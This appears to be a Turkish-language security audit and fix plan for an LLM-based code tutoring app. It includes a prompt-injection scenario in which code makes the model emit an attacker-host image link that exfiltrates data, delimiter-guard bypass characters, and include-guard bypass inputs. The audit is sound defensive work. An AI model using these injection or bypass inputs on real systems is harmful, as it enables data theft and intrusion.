+- **Test:** bozuk DB yolu ile `launch.main` → çökmeden hata akışı.
+
+### O11 — Kök `--help` Türkçe karakterleri bozuk basıyor 🟡 🔬
+
+- **Dosya:** `src/codementor/cli/main.py:30-37`
+- **Ne yanlış:** `ensure_utf8_console()` yalnız alt komut callback'inde çalışıyor; Windows'ta
+  `codementor --help` `�` basıyor, alt komut yardımları düzgün.
+- **Düzeltme:** modül yüklenirken ya da `app()` çağrısından önce çalıştır.
+
+### O12 — Diğer CLI komutları traceback veriyor 🟡 🔬
+
+- **Dosyalar:** `cli/toolchain.py:39, 68`, `cli/eval.py:212`
+- **Ne yanlış:** `toolchain status/install` bozuk toml'da ham traceback (exit 1). `eval compare`
+  olmayan ya da bozuk dosyada `FileNotFoundError`/`ValidationError` traceback'i (exit 1). Diğer
+  komutlar 3 dönüyor; tutarsız.
+- **Düzeltme:** ortak bir hata sarmalayıcı (Türkçe mesaj, çıkış 3).
+
+### O13 — Masaüstünde dışa aktarma hatası sessiz 🟡 📖
+
+- **Dosya:** `src/codementor/desktop/app.py:320-333`
+- **Ne yanlış:** `write_text` için `OSError` yakalanmıyor; kilitli/izinsiz konumda kullanıcı hiçbir
+  şey görmüyor.
+- **Düzeltme:** yakala, toast/hata diyaloğu göster.
+
+### O14 — "Geçmişi temizle" gizlilik açısından eksik 🟡 📖
+
+- **Dosyalar:** `storage/cache.py:161-166`, `storage/sessions.py:103`
+- **Ne yanlış:**
+  - Silmeden sonra `VACUUM` ya da `PRAGMA secure_delete` yok. Silinen `report_json` (kanıt
+    satırlarında öğrenci kodu var) SQLite'ın boş sayfalarında okunabilir kalıyor.
+  - Son dosyalar listesi (`desktop.json`) ve `desktop.log` temizlenmiyor.
+- **Düzeltme:** `clear_analyses` sonrası `VACUUM`; `secure_delete=ON`; temizlik son dosyaları da
+  kapsasın (logu temizlemek isteğe bağlı).
+
+### O15 — Monaco hover güvenilmeyen markdown işliyor 🟡 📖
+
+- **Dosya:** `web/src/lib/markers.ts:31` (`hoverMessage: { value }`), `:57` (`f.description`),
+  `:63` (`d.message`)
+- **Ne yanlış:** LLM bulgu açıklamaları (kullanıcı koduyla yönlendirilebilir) ve derleyici iletileri
+  (kullanıcı kodundan alıntı) kaçışsız `IMarkdownString` olarak veriliyor. Monaco 0.57'de
+  `isTrusted=false` iken `command:` kapalı ve HTML kaçışlanıyor, ama http/https/mailto
+  bağlantılarına ve http(s)/data görsellerine izin var.
+- **Senaryo:** koda gömülü bir talimat modele `![](https://saldirgan/?q=...)` ya da
+  `[ipucu](https://phish)` yazdırıyor; hover açılınca dış istek gidiyor ya da tıklanabilir bağlantı
+  çıkıyor. Sızıntı korumasının kod desenleri bunu yakalamıyor. Tarayıcıda denenmedi.
+- **Düzeltme:** markdown özel karakterlerini kaçışla (`\ * [ ] ( ) ! < \``) ya da açıklamayı düz
+  metin ver.
+- **Test:** `![x](http://e)` içeren açıklama düz metin kalıyor.
+
+### O16 — CSP ve güvenlik başlıkları yok 🟡 📖
+
+- **Dosyalar:** `web/index.html`, API ara katmanı
+- **Düzeltme:** web için CSP (`default-src 'self'; img-src 'self' data:; worker-src blob: 'self';
+  connect-src 'self' http://127.0.0.1:8000`) — O15'teki dış görseli de kapatır. API'de
+  `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`.
+
+### O17 — CI ve release süreci 🟡 📖
+
+- **Dosya:** `.github/workflows/ci.yml`
+- **Eksikler:**
+  - Etiket (`v*`) tetikli release işi yok. Artefakt 14 gün sonra siliniyor, README ise indirmeyi
+    Releases'tan anlatıyor; release elle yapılıyor ve tekrarlanamaz.
+  - `permissions: contents: read` yok.
+  - Action'lar SHA'ya sabitlenmemiş.
+  - Exe artefaktında duman testi yok (açılış ya da `_internal` içinde `data/`, `prompts/`,
+    `queries/` varlık kontrolü).
+  - `concurrency` yok (aynı dalda üst üste koşular).
+  - Release'te `SHA256SUMS` yok.
+  - Dependabot / Renovate yok.
+- **Düzeltme:** `release.yml` (etiket → exe derle → duman testi → Releases'a zip + SHA256SUMS);
+  `permissions`, `concurrency`, action SHA'ları; `dependabot.yml` (pip, npm, actions).
+
+### O18 — Sürüm tutarsızlığı 🟡 ✅
+
+- **Ne yanlış:**
+  - `v0.1.0` etiketi `2cea9d5`'te; main bir commit ileride (`d42515c`, CLI dil düzeltmesi). Release
+    zip'i bu düzeltmeyi içermiyor.
+  - Sürüm iki yerde: `pyproject.toml:3` ve `src/codementor/__init__.py:3`. Eşitliklerini sınayan
+    test yok.
+- **Düzeltme:** tek kaynak (`importlib.metadata.version("codementor")` ya da hatch dinamik sürüm);
+  güvenlik düzeltmelerinden sonra **0.1.1** etiketi ve yeni release.
+
+---
+
+## 5. Düşük
+
+| Kimlik | Dosya | Bulgu | Düzeltme |
+|---|---|---|---|
+| D1 | `prompts/v1/repair.user.j2:1-4`, `prompts/templates.py:28` | Hatalar `<validation_errors>` içine konuyor ama `guard_delimiters` bu etiketi nötrlemiyor; Pydantic `extra_forbidden` `loc`'u modelin uydurduğu anahtar adını taşır. Karmaşıklık onarımında da "şemaya uymadı" deniyor (yanıltıcı). | Etiketi guard listesine ekle; onarım nedenine göre metin. |
+| D2 | `verify/schema_check.py:26-40` | `extract_json` düz yazıdaki tek bir `"` karakterinden sonra JSON'u bulamıyor (`Model "notu: {"a": 1}` → `None`, ajan doğruladı). | Tırnak durumunu yalnız `{` içinde izle. |
+| D3 | `providers/codex_cli.py:78` | `_events` yalnız `ValueError` yakalıyor; derin iç içe JSON'da `RecursionError` sızar. `agy_stream` ve `_http` ikisini de yakalıyor. | `RecursionError` ekle. |
+| D4 | `providers/codex_cli.py:59-60` | `_LIMIT_HINTS`'teki çıplak `"429"` ve `_LOGIN_HINTS`'teki `"401"` her alt dizgeyle eşleşir ("line 429"). | Kelime sınırlı regex. |
+| D5 | `verify/proof.py:110, 133` | `apply_verdicts` bulguları yeniden numaralıyor ama `FindingCheck.finding_id` eski kimliği tutuyor. | Yeni kimliği yaz. |
+| D6 | `pipeline/passes.py:79` | Geçişler farklı sağlayıcılara düşerse `meta.provider/model` son çağrının; tüm tokenler o fiyatla hesaplanıyor. | Geçiş başına sağlayıcı/maliyet. |
+| D7 | `pipeline/passes.py:160-171` | Sızıntıdan sonra yeniden üretim aynı prompt + aynı ayarla; sıcaklığı sabit sağlayıcıda (claude_cli) büyük olasılıkla aynı sızıntı. | İçerik sızdırmayan "daha soyut sor" notu ekle. |
+| D8 | `prompts/builder.py:64-72`, `orchestrator.py:161` | `FewShotError`, Jinja hataları, `FileNotFoundError` yakalanmıyor; bozuk few-shot YAML'ı her analizi 500 ile düşürüyor. | Yakalayıp `degraded` dön. |
+| D9 | `providers/anthropic.py:40`, `orchestrator.py:261`, `prompts/budget.py:27` | Ölü/tekrar kod: `DEFAULT_MAX_TOKENS` tekrarı, gereksiz `isinstance`, kullanılmayan `built` dönüşleri; üretimde `TEST_PROVIDERS={"fake"}` test kancası. | Temizle. |
+| D10 | `models/schemas.py:26-38` | `LLMMarkupAnalysisOutput` `SCHEMA_MODELS`'te yok; HTML/CSS LLM şeması `schemas/` altına yazılmıyor. | Ekle, `schemas/` yeniden üret. |
+| D11 | `prompts/builder.py`, `orchestrator.py` | Olay döngüsünde küçük bloklayan G/Ç: `prompt_version` her analizde `rglob`+`stat`; `_rules_version` veri dosyalarını 2 kez okuyor; `_question_bank` her istekte disk (CLI). | Önbellekle. |
+| D12 | `providers/cli_agent.py:108-126` | `_json_document` karesel (160 KB'de 2,7 sn; 64 KB sınırıyla ≤0,5 sn). O5'te sınır büyütülürse sorun olur. | Doğrusal tarama. |
+| D13 | `prompts/templates.py:36-55` | Sınırlayıcı korumasında atlanan benzer karakterler: `˂` (U+02C2), `❮` (U+276E), `❰` (U+2770), `﹤` varyantı, `«` (U+00AB), düz `&lt;/user_code&gt;`. | `_CONFUSABLES`'a ekle, `&lt;` biçimini desene kat. |
+| D14 | `api/auth.py:105`, `providers/health.py:105-133` | API anahtarı tanımlıyken bile `/health/ready`, `/docs`, `/openapi.json` açık; sağlayıcı/model adları, anahtar değişken adları, çalıştırılabilir yolları sızıyor. | Anahtar varken `/health/ready`'yi koru; `/health` açık kalsın. |
+| D15 | `report/markdown.py:14, 24, 61, 80-83` | LLM metni ve derleyici iletisi ham yazılıyor (yalnız `\|` kaçışlı); dosyada `<details>` HTML'i de var. HTML'e izin veren görüntüleyicide XSS. | `< > &` kaçışı. |
+| D16 | `models/request.py:36`, `storage/sessions.py:146` | `session_id` sahipsiz; kimliği bilen başkasının ipucu merdivenini ilerletir. Rastgele kimliklerle `sessions` tablosu büyütülebilir (bilinen). | Paylaşılan sunucu için belgeye yaz; ileride anahtara bağla. |
+| D17 | `web/src/lib/download.ts:10` | `revokeObjectURL` `click()`'ten hemen sonra; bazı tarayıcılarda indirme iptal olabilir (doğrulanmadı). | `setTimeout(..., 0)`. |
+| D18 | `validation/tier0_isolation.py:102` | Durdurma tanısı metinle tanınıyor (`startswith("Kodun sözdizimi")`); metin değişirse sessizce bozulur. | Yapısal bayrak. |
+| D19 | `desktop/app.py:396`, `storage/db.py` | `delete_history` analiz sürerken engellenmiyor (`clear_history` engelliyor). Veritabanında WAL, `busy_timeout`, şema sürümü (`user_version`) yok. DB dosyası POSIX'te 0600 oluşturulmuyor (doğrulanmadı). | Engelle; WAL + `busy_timeout`; `user_version` ile göç. |
+| D20 | çeşitli | `cli/rules.py:20-25` `rules list` `[rules] disabled`'ı uygulamıyor. `--help` metinleri karışık dilli ("Show this message and exit."). `eval run --language` serbest metin. `buildinfo.py:15` maskesiz global logger. `build_exe.py:63-70` FastAPI/uvicorn'u gereksiz paketliyor. Kapanışta süren analiz/indirme için onay yok. `pyproject.toml`'da `authors`, `[project.urls]`, `classifiers`, `keywords` yok; GUI bağımlılıkları CLI kurulumuna zorunlu (`[desktop]` extra önerilir). | Tek tek. |
+
+**400 satır sınırı (AGENTS.md):** `desktop/app.py` 494, `pipeline/orchestrator.py` 415 satır →
+bölünmeli. Sınıra yakın: `analysis/extractor.py` 398, `desktop/views/analyze_view.py` 391,
+`desktop/connections.py` 387, `analysis/complexity_hint.py` 386, `desktop/viewmodel.py` 378.
+
+---
+
+## 6. Public yayın hazırlığı
+
+| # | Konu | Durum | Yapılacak |
+|---|---|---|---|
+| P1 | Git geçmişinde gerçek anahtar | ✅ Yok (yalnız `sk-ant-test-SECRET-…` test sahtesi) | — |
+| P2 | `.env`, `private/` | ✅ `.gitignore`'da | — |
+| P3 | `linkedin metini.md` | ⚠️ İzlenmiyor ama `.gitignore`'da da değil | `.gitignore`'a ekle |
+| P4 | Referans çözüm sızıntısı | ❓ Y2 | Kontrol et |
+| P5 | İç çalışma belgeleri | ⚠️ `docs/DEVIR_FAZ52_54.md`, `DEVIR_FAZ55.md`, `DEVIR_FAZ60_62.md`, `CODEX_3_4_YAPILANLAR.md`, `YAPILANLAR_60_62_ANTIGRAVITY.md`, `FAZ36_OLCUM_DURUMU.md`, `EVAL_PARCA_REHBERI.md` | `docs/gelistirme-gunlugu/` altına taşı |
+| P6 | `PROGRESS.md` | ⚠️ 252 KB | Arşivle; kökte kısa özet bırak |
+| P7 | README doğruluğu | ⚠️ "59 fazda" yazıyor, gerçekte 63; O1 nedeniyle web silme iddiası varsa düzelt | Güncelle |
+| P8 | İngilizce README | ❌ Yok | `README.en.md` (kısa: ne, neden, hızlı başlangıç, sonuçlar) |
+| P9 | `CONTRIBUTING.md`, `SECURITY.md`, `CHANGELOG.md`, issue/PR şablonları | ❌ Yok | Ekle (`SECURITY.md` önemli: güvenlik açığı bildirimi) |
+| P10 | Release | ⚠️ O17, O18 | 0.1.1 + otomatik release |
+| P11 | Yerel `dist/` | ⚠️ `dist/CodeMentor.exe` Faz 63 öncesi; `dist/codementor.toml` 6 Ekim tarihli ve exe yanında (ADR-0027'deki hataya yol açan tür) | Sil / yeniden derle (repo dışı) |
+| P12 | `.agents/`, `.claude/` | ℹ️ Repoda | Kalabilir (geliştirme sürecini gösteriyor); bilinçli karar ver |
+| P13 | GitHub repo ayarları | ℹ️ Açıklama ve konular dolu; `homepageUrl` boş | Secret scanning + push protection + Dependabot alerts aç |
+
+---
+
+## 7. Sağlam bulunanlar
+
+Denetçilerin doğruladığı, düzeltme gerektirmeyen noktalar:
+
+- **CSRF:** `text/plain` ya da içerik türsüz POST 422; sağlayıcı çağrılmıyor (FastAPI 0.142). Not:
+  FastAPI varsayılanına dayanıyor → regresyon testi önerilir (§8).
+- **Host denetimi:** `localhost.evil.com`, `localhost.` 400 (DNS rebinding koruması çalışıyor).
+- **API anahtarı:** `hmac.compare_digest` ile sabit zamanlı.
+- **Yol geçişi:** soru ve analiz kimlikleri ULID / sözlük aramasıyla sınırlı; `delete_source`
+  `isalnum()` korumalı.
+- **SQL:** tamamen ORM ve parametreli.
+- **Hata yanıtları:** 422 girdiyi yansıtmıyor; 500 ve SSE hatalarında yalnız istisna türü loglanıyor.
+- **Prompt:** `<user_code>` builder içinde guard'dan geçiyor; referans çözüm prompt'a girmiyor;
+  sızıntı kontrolü gerekçe adımlarına ve bulgu açıklamalarına da uygulanıyor.
+- **Web XSS:** `dangerouslySetInnerHTML` / `innerHTML` yok.
+- **Şemalar:** `schemas/*.json` Pydantic modelleriyle birebir (betikle karşılaştırıldı).
+- **Kural 5:** kodda gömülü model adı / URL yok.
+- **Toolchain indirme:** sha256 hem akışta hem diskten doğrulanıyor; her yönlendirmede https
+  zorunlu; boyut/dosya sayısı tavanlı; `safe_extract` symlink, `..`, aygıt adı, çakışma redleri
+  sağlam.
+- **Alt süreç ortamı:** izin listeli (`sanitized_env`); API anahtarları geçmiyor; gcc/clang stderr'i
+  loglanmıyor; Roslyn stderr'i `scrub`'lı.
+- **Masaüstü iş parçacığı güvenliği:** arka plan iş parçacığından widget'a dokunan yer bulunmadı;
+  köprü kuşak ve iptal mantığı doğru.
+- **`build_exe.py` DATA listesi:** çalışma anında okunan tüm veri dosyalarını kapsıyor.
+- **Karmaşıklık ipucu:** ikili arama → `log n`, iç içe döngü → `n^2`, `i*=2` → `log n`, sabit döngü
+  → `1` doğru. `i*i<=n` O(√n) yerine `n`/low (muhafazakâr, kabul edilebilir).
+- **Geniş `except`'ler:** hepsi gerekçeli ve loglanıyor; sessiz yutma yok.
+
+---
+
+## 8. Eksik testler
+
+**Güvenlik**
+1. `include_guard`: `#/**/include`, `%:/**/include`, `#/*\n*/include` red fixture'ları (K1).
+2. `compiler` işaretli uçtan uca: atlatma girdisi Tier 1'e ulaşmıyor (K1).
+3. Tüm `detect` / `rules` / `analysis` regex'leri için en kötü durum + süre bütçesi (K2).
+4. Araç keşfinde çalışma dizini sahte derleyici reddi (Y1).
+5. Dosya varlığı kahini: var/yok ayrımı kullanıcıya sızmıyor (K1).
+6. `guard_delimiters`: U+02C2, U+276E, `&lt;/user_code` (D13).
+7. `text/plain` CSRF regresyonu (FastAPI sürümü değişirse sessizce açılmasın).
+8. Anahtar tanımlıyken `/health/ready`, `/openapi.json`, `/docs` erişim politikası (D14).
+9. Web: `markers.ts` markdown kaçışı (O15).
+
+**LLM hattı**
+
+10. Onarım bozuk / çelişki sürüyor → ilk geçerli bulgular korunuyor (Y3).
+11. Geçiş B `ProviderError` / `PromptBudgetError` / zaman aşımı → Geçiş A korunuyor (Y4).
+12. Fallback yanıtı birincil anahtarla önbellekten dönmüyor (Y5).
+13. `single_pass` + kanıtsız bulgu → ayrı Geçiş B (O2).
+14. Önbellek dönüşünde `cost_est is None` (O4).
+15. `options.tier1` / `rules.disabled` değişince önbellek ıskalanıyor (O3).
+16. Seviye < 3'te kavram adı masaüstü/API/JSON'da yok; sızıntılı kavram adı yakalanıyor (Y6).
+17. 64 KB'yi aşan agy/codex akış çıktısı (O5).
+18. `</validation_errors>` içeren `loc` (D1); codex'te derin iç içe JSON satırı (D3).
+
+**Masaüstü / CLI / config**
+
+19. `config_writer`: satır içi tablo, nokta anahtarı, BOM, atomik yazım (Y7, O7).
+20. Exe'de "yaz → yeniden yükle" aynı dosyayı kullanıyor (Y8).
+21. CLI çıkış kodları: DB hatası, `--out` yazılamıyor, `toolchain status` bozuk toml, `eval compare`
+    olmayan dosya → hepsi 3 (Y9, O12).
+22. Kodda geçen her `resource_path("…")`'in `build_exe.DATA` altında olduğunu çapraz denetleyen test;
+    exe artefaktı duman testi (O17).
+23. `pyproject` sürümü == `__version__` (O18).
+24. `launch.main` bozuk DB; export `OSError` (O10, O13).
+25. Kök `--help` UTF-8 çıktısı (O11).
+
+---
+
+## 9. Eklenmesi önerilen özellikler
+
+**Web**
+- Geçmiş listesi (`GET /v1/analyses` + sayfalama), tekil ve toplu silme (`DELETE /v1/analyses`),
+  oturum silme (`DELETE /v1/sessions/{id}`).
+- Web istemcisinden `X-API-Key` gönderme (şu an anahtar tanımlanırsa web çalışmaz; bilinen).
+- Soru filtresi boşsa "eşleşen soru yok" mesajı (bilinen).
+- İstemci başına hız sınırı (bilinen).
+- `serve` dışa açık adrese bağlanırken anahtar yoksa başlamayı reddetmek (ya da `--insecure`).
+
+**Masaüstü**
+- Ctrl+S ile kaydetme; dosya açma / bırakma / geçmişten açmada kaydedilmemiş değişiklik uyarısı.
+- Geçmişte sayfalama ve arama (şu an `list_analyses` limit=50, 2000'e kadar saklanıyor).
+- Bozuk / eski veritabanı için "yedekle ve sıfırla".
+- Kapanırken "analiz/indirme sürüyor, çıkılsın mı?" onayı.
+- Keyring'deki tüm anahtarları ve eski OpenAI/DeepSeek kayıtlarını temizleme (bilinen).
+- Linux/macOS'ta "Oturum aç" desteği (şu an yalnız Windows konsolu).
+- İmzalı exe + kurulum paketi (bilinen).
+
+**Statik kurallar (dil başına kural sayısı: C 6, Python 6, HTML 7, CSS 3, C++ 3, C# 3, Unreal 3)**
+- **CSS (en zayıf):** `outline:none` + focus göstergesi yok (CSS-CL-004), sabit `px` yükseklik
+  taşması (CSS-CL-006), `position:absolute` + margin hack ile ortalama (CSS-CL-007). Kontrol
+  listesinde var, statik kuralı yok.
+- **C++:** döngüde `std::string +` / `+=` karesel (bilinen); döngüde `std::endl` (gereksiz flush);
+  `reserve` olmadan döngüde `push_back`.
+- **C:** genişlik sınırı olmayan `scanf("%s")` (tampon taşması).
+- **Unreal:** `TArray<AActor*>` / `TMap<…, UObject*>` kapsayıcı alanları (UE-GC-001 kaçırması, bilinen).
+- **C#:** `IList`/`IReadOnlyList` tipli değişkenler (CS-PERF-001 kaçırması, bilinen); döngüde
+  `string +=`.
+
+**Daha önce planlanmış olanlar**
+- Eski Faz 64-66 (`docs/GUNCELLEMELER.md`): yerel model ölçümü, küçük modeller için Sokratik kalite
+  kapısı, yerel modelde hız.
+- PROGRESS "Sonraya" (~60 madde).
+- README yol haritası: cppcheck / clang-tidy, LLM-as-judge Sokratik kalite puanı, VS Code eklentisi,
+  Rust/Go.
+
+---
+
+## 10. Faz planı (A-J)
+
+**Karar (2026-10-12):** fazlar harfle numaralanır; eski Faz 64-66 Faz I'ya taşındı.
+
+Kimlikler (K/Y/O/D/P) bu belgenin §2-§6 bölümlerine işaret eder. Yeni fazlar sayı yerine **harfle**
+numaralanır; eski Faz 64-66 (yerel modeller) **Faz I**'ya taşındı. Her faz standart döngüyle
+uygulanır: plan modu → onay → test → `make check` → kabul kriterleri → PROGRESS → commit önerisi
+→ `kod-denetci` denetimi.
+
+**Öncelik:** A-D repo public olmadan (2026-10-18) bitmeli. E-I public sonrası.
+
+| Faz | Kapsam | Zaman |
+|---|---|---|
+| A | Güvenlik açıkları | 18 Ekim öncesi, **şart** |
+| B | Bulgu kaybı ve önbellek doğruluğu | 18 Ekim öncesi |
+| C | İpucu merdiveni, yapılandırma, CLI | 18 Ekim öncesi |
+| D | Public belgeler ve release | 18 Ekim öncesi |
+| E | Web: geçmiş, silme, güvenlik başlıkları | Sonra |
+| F | Masaüstü sağlamlık ve UX | Sonra |
+| G | Sağlayıcı sağlamlığı ve kod temizliği | Sonra |
+| H | Statik kurallar ve analiz doğruluğu | Sonra |
+| I | Yerel modeller ve eval (eski Faz 64-66) | Sonra |
+| J | Açık kalan diğer işler (havuz) | İhtiyaç oldukça |
+
+---
+
+### Faz A — Güvenlik açıkları (öncelik: kritik)
+
+**Dal:** `faz/a-guvenlik` · **Mimari:** §4.4, §12 · **ADR:** gerekirse 0010/0023 eki
+
+**Amaç:** Public öncesi, kullanıcı kodunun sunucuyu kilitlemesini ve derleyici aracılığıyla host
+dosya sistemine dokunmasını kesin olarak engellemek.
+
+- [ ] **K1 — Include koruması:** yönerge araması maskelenmiş metinde de yapılır; `#/**/include`,
+      `%:/**/include`, satırı bölen yorumlu biçim (`#/*\n*/include`) fail-closed reddedilir
+      (`validation/include_guard.py`)
+- [ ] **K2 — ReDoS:** `ingest/detect.py:133` deseni doğrusal hale gelir (kübik, saatler)
+- [ ] **K2 — Karesel desenler:** `detect.py`'deki `re.M` + `^\s*` desenleri (satır 82, 83, 76,
+      105, 106, 108, 115, 120, 132) `^[ \t]*` ve satır içi `[^…\n]` sınıflarıyla düzeltilir;
+      `analysis/_recursion.py:21`, `verify/lines.py:20`, `verify/proof.py:50` ve `analysis/`,
+      `rules/` içindeki diğer regex'ler en kötü girdiyle taranır
+- [ ] **K2 — Olay döngüsü:** `Orchestrator._ingest` (dil tespiti dahil) `asyncio.to_thread`'e
+      alınır; analiz süre sınırı bu aşamayı da kapsar
+- [ ] **Y1 — Araç keşfi:** çalışma dizinindeki çalıştırılabilir dosya derleyici olarak seçilmez
+      (`validation/toolchain.py`); Windows'taki `NoDefaultCurrentDirectoryInExePath`
+      davranışına bağlı kalınmaz. `providers/_cli_common.py` `_candidates()` mantığı ortak
+      yardımcıya çıkarılıp iki yerde de kullanılır
+- [ ] **Y2 — Referans çözüm:** `tests/fixtures/llm_responses/unity03_reference.cs` bankadaki
+      çözümle karşılaştırılır (kullanıcı; `private/` erişimi). Aynıysa bankada olmayan yapay bir
+      çözümle değiştirilir, golden'lar yeniden üretilir
+- [ ] **D13 — Sınırlayıcı:** `˂` (U+02C2), `❮` (U+276E), `❰` (U+2770), `«` (U+00AB) ve
+      `&lt;/user_code&gt;` biçimi `guard_delimiters`'a eklenir
+- [ ] **P3:** `linkedin metini.md` `.gitignore`'a eklenir
+- [ ] Testler:
+  - include: üç atlatma biçimi + `# /* a */ include`, `#/**//**/include` red; `compiler`
+    işaretli uçtan uca test (yönerge Tier 1'e ulaşmaz)
+  - ReDoS: her sinyal deseni için en kötü durum girdileri < 50 ms; hypothesis ile süre bütçesi;
+    40 KB `"a:" + boşluk` girdisi analizde hızlı biter
+  - araç keşfi: geçici dizinde sahte `gcc`/`gcc.bat` + `chdir` → seçilmez
+  - sınırlayıcı: yeni benzer karakterler nötrlenir
+
+**Kabul:** üç atlatma girdisi reddedilir; 40 KB kötü niyetli girdi < 1 sn; `/health` analiz
+sırasında yanıt verir; `make check` yeşil.
+**Commit:** `fix(faz-a): include koruması, ReDoS ve araç keşfi güvenlik açıkları`
+
+---
+
+### Faz B — Bulgu kaybı ve önbellek doğruluğu (öncelik: yüksek)
+
+**Dal:** `faz/b-bulgu-kaybi-onbellek` · **Mimari:** §5.4, §8 · **ADR:** gerekirse 0019 eki
+
+**Amaç:** LLM'in kısmi başarısızlığında doğrulanmış bulgular kaybolmasın; önbellek yalnız tam ve
+doğru anahtarlı sonuç döndürsün.
+
+- [ ] **Y3 — Onarım:** onarım başarısız ve kalan hata yalnız karmaşıklıksa bulgular korunur,
+      `complexity=None` + uyarı; şema hatasıyla biten onarımda son geçerli yanıt kullanılır
+      (`pipeline/passes.py:122-147`)
+- [ ] **Y4 — Geçiş B:** `run_llm_passes` kısmi sonuç döndürür; Geçiş B'deki sağlayıcı/bütçe/süre
+      hatası Geçiş A bulgularını silmez, Sokratik kısım şablona düşer (Sonraya: Faz 48 denetimi
+      maddesi de kapanır)
+- [ ] **Y5 — Fallback önbelleği:** yanıtı fallback sağlayıcı verdiyse ya da LLM kısmen başarısızsa
+      (Sokratik şablon, doğrulama hatası) rapor önbelleğe alınmaz
+- [ ] **O2 — `single_pass`:** kanıt kontrolü bulgu düşürünce sorular atılır, ayrı Geçiş B yapılır
+      (§5.4.2)
+- [ ] **O3 — Önbellek imzası:** `options.tier1`, derleyici kimliği/sürümü, `rules.disabled`,
+      `rules.max_findings`, prompt ayarları, `verify.*`, `max_repair_attempts` ve soru içeriği
+      özeti anahtara girer (Sonraya: Faz 49 maddeleri de kapanır)
+- [ ] **O4 — Maliyet:** önbellekten dönen raporda `cost_est=None`, `usage_estimated=False`
+- [ ] Testler: §8 madde 10-15 (BulgularVeDuzeltilecekler)
+
+**Kabul:** her senaryo FakeProvider testiyle; statik dev eval bulguları değişmez; `make check`
+yeşil.
+**Commit:** `fix(faz-b): kısmi LLM hatasında bulguları koru, önbellek imzasını tamamla`
+
+---
+
+### Faz C — İpucu merdiveni, yapılandırma ve CLI (öncelik: yüksek)
+
+**Dal:** `faz/c-ipucu-yapilandirma`
+
+**Amaç:** Kavram adı hiçbir arayüzde erken açılmasın; kullanıcının ayarı bozulmasın; CLI sistem
+hatasını bulgudan ayırsın.
+
+- [ ] **Y6 — Kavram adı:** gösterim kuralı tek bayrakta (ör. `SocraticResult.concept_revealed`);
+      masaüstü, web, CLI, Markdown, API JSON aynı kuralı uygular; `key_flaw_concept` sızıntı
+      denetimine girer
+- [ ] **Y7 — toml yazıcısı:** satır içi tablo, nokta anahtarı ve yorumlar korunur; yazım atomik
+- [ ] **Y8 — Exe toml yolu:** toml'suz exe'de yazılan dosya `CONFIG_FILE_ENV` ile etkinleşir;
+      Bağlantılar ekranı gerçek konumu gösterir
+- [ ] **O7 — BOM:** BOM'lu toml okunur ve yazılır
+- [ ] **O8 — `.env`:** karar: `.env` desteği ya da açık uyarı; `.env.example` güncel değişkenlerle
+      (`ANTHROPIC_API_KEY`, `GEMINI_API_KEY`, `CODEMENTOR_API_KEY`)
+- [ ] **O9 — Wheel:** varsayılan toml pakete girer; kurulu masaüstü `~/.codementor/codementor.toml`
+      kullanır
+- [ ] **Y9, O12 — CLI çıkış kodları:** sistem hataları Türkçe mesaj + çıkış 3; `--out` `with` ile
+- [ ] **O11 — `--help`:** kök yardım UTF-8
+- [ ] **D20 (kısmi):** `rules list` `[rules] disabled`'ı gösterir
+- [ ] Testler: §8 madde 16, 19-21, 25
+
+**Commit:** `fix(faz-c): ipucu merdiveni tutarlılığı, toml yazımı, CLI çıkış kodları`
+
+---
+
+### Faz D — Public belgeler ve release (öncelik: yüksek)
+
+**Dal:** `faz/d-public-release`
+
+**Amaç:** Repo public olduğunda ziyaretçi doğru, güncel ve derli toplu bir proje görsün; indirme
+tekrarlanabilir bir release'ten gelsin.
+
+- [ ] **P5, P6 — Belge düzeni:** iç çalışma belgeleri (`DEVIR_*`, `CODEX_3_4_YAPILANLAR`,
+      `YAPILANLAR_60_62_ANTIGRAVITY`, `FAZ36_OLCUM_DURUMU`, `EVAL_PARCA_REHBERI`) ve PROGRESS
+      arşivi `docs/gelistirme-gunlugu/` altına; bağlantılar güncellenir
+- [ ] **O1 — Faz 62 belgesi:** `GUNCELLEMELER.md`'deki yapılmamış web/toplu silme maddeleri
+      düzeltilir (Faz E'ye taşınır)
+- [ ] **P7 — README:** faz sayısı, test sayısı, özellik iddiaları kodla karşılaştırılır
+- [ ] **P8 — `README.en.md`:** kısa İngilizce sürüm (ne, neden, hızlı başlangıç, sonuçlar)
+- [ ] **P9:** `SECURITY.md` (açık bildirimi), `CONTRIBUTING.md`, `CHANGELOG.md`, issue/PR şablonları
+- [ ] **O18 — Sürüm:** tek kaynak (`importlib.metadata`); eşitlik testi; **0.1.1**
+- [ ] **O17 — CI:** `release.yml` (etiket → exe → duman testi → Releases + `SHA256SUMS`),
+      `permissions: contents: read`, `concurrency`, action SHA'ları, `dependabot.yml`
+- [ ] **P11 (yerel):** eski `dist/CodeMentor.exe` ve `dist/codementor.toml` temizlenir, yeniden
+      derlenir; **eski Faz 60'ın açık maddesi** (güncel exe ile 64 görev, agy, geçmiş açma
+      doğrulaması) burada kapanır
+- [ ] **P13 (kullanıcı):** GitHub'da secret scanning, push protection, Dependabot alerts
+- [ ] **D20 (kısmi):** `pyproject.toml` `authors`, `[project.urls]`, `classifiers`, `keywords`
+
+**Kabul:** etiket atılınca release otomatik oluşur ve exe açılır; README'deki her komut çalışır.
+**Commit:** `docs(faz-d): public yayın belgeleri ve otomatik release`
+
+---
+
+### Faz E — Web: geçmiş, silme, güvenlik başlıkları (öncelik: orta)
+
+**Dal:** `faz/e-web`
+
+- [ ] `GET /v1/analyses` (sayfalı), `DELETE /v1/analyses` (toplu, API anahtarı açıksa korumalı),
+      `DELETE /v1/sessions/{id}`
+- [ ] Web'de geçmiş paneli, satır başına sil, "tümünü temizle" (onaylı) — eski Faz 62'nin
+      yapılmamış kısmı
+- [ ] Web istemcisinden `X-API-Key` gönderme (Sonraya: Faz 26)
+- [ ] **O15:** Monaco hover metni kaçışlanır
+- [ ] **O16:** web CSP; API `nosniff`, `Referrer-Policy`
+- [ ] **D14:** anahtar varken `/health/ready` korunur
+- [ ] **D15:** Markdown dışa aktarımında `< > &` kaçışı
+- [ ] **D17:** indirme URL'si gecikmeli iptal
+- [ ] Soru filtresi boşsa "eşleşen soru yok" (Sonraya: Faz 30)
+- [ ] İstemci başına hız sınırı; dışa açık adreste anahtarsız `serve` reddi ya da `--insecure`
+      (Sonraya: Faz 11, 26)
+- [ ] Testler: Vitest + Playwright + API; CSRF `text/plain` regresyonu
+
+---
+
+### Faz F — Masaüstü sağlamlık ve UX (öncelik: orta)
+
+**Dal:** `faz/f-masaustu`
+
